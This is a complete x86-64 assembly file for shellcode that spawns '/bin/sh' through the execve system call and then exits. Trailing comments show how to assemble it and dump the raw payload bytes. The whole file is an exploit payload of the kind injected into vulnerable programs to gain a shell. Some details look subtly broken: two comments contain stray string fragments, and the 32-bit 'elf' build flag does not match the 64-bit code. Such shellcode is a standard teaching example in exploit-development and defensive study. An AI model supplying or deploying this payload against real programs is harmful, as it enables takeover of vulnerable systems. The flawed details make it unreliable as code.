section .text
global _start
_start:
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp  ; rdi = "/bin/sh\x00"
    xor rsi, rsi  ; rsi = NULL
    xor rdx, rdx  ; rdx = NULL
    mov rax, 0x3b ; rax = sys_execve
    syscall       ; execve("/bin/sh", null, null)
    xor rdi, rdi  ; rdi = 0\n"
    mov rax, 0x3c ; rax = sys_exit\n"
    syscall       ; exit(0)

; nasm -f elf shellcode.asm
; objdump -d shellcode.o
; objcopy --dump-section .text=shellcode.bin shellcode.o
; xxd shellcode.bin